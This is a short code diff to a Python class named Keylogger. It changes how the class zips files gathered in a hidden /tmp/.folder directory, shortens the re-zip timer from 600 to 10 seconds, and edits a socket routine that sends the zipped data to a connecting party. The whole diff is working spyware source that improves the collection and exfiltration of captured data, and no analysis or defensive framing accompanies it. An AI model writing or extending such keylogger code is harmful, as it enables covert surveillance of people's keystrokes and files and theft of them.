@@ -191,13 +191,13 @@ class Keylogger:
 	Zip folder contents before sending as email
 	Param : directory of folder location
 	'''
-	def zip_folder(self, direc):
+	def zip_folder(self):
 		# list to contain all path of files to zip
 		file_paths = []
 		zip_name = 'zipped_file.zip'
 		# os.walk returns current_path, directories in current_path,
 		# files in current_path
-		for root, _, files in os.walk(direc):
+		for root, _, files in os.walk(self.directory):
 			for file in files:
 				# joining absolute path with file name
 				filepath = os.path.join(root, file)
@@ -205,7 +205,7 @@ class Keylogger:
 				file_paths.append(filepath)
 
 		# creating zipped file
-		with ZipFile('/tmp/.folder/'+zip_name, 'w') as zipped:
+		with ZipFile('/tmp/.folder/' + zip_name, 'w') as zipped:
 			# for every file in list of file paths,
 			# add file to zip file
 			for file in file_paths:
@@ -218,9 +218,9 @@ class Keylogger:
 	'''
 	def socket_listen_send(self):
 		# zip file composed of folders contents
-		ziped_name = self.zip_folder(self.directory)
+		ziped_name = self.zip_folder()
 		# rewrite existing zip file with new contents
-		zip_restart = threading.Timer(600, self.zip_folder, list(self.directory))
+		zip_restart = threading.Timer(10, self.zip_folder)
 		# start zipping clock
 		zip_restart.start()
 		# creating socket context manager
@@ -236,7 +236,7 @@ class Keylogger:
 			# accept and receive connection
 			connection, address = soc.accept()
 			# open file to read as bytes
-			with open('/tmp/.folder/'+ziped_name, 'rb') as zip_file:
+			with open('/tmp/.folder/' + ziped_name, 'rb') as zip_file:
 				# read bytes from file
 				content = zip_file.read()
 				# send bytes data over socket
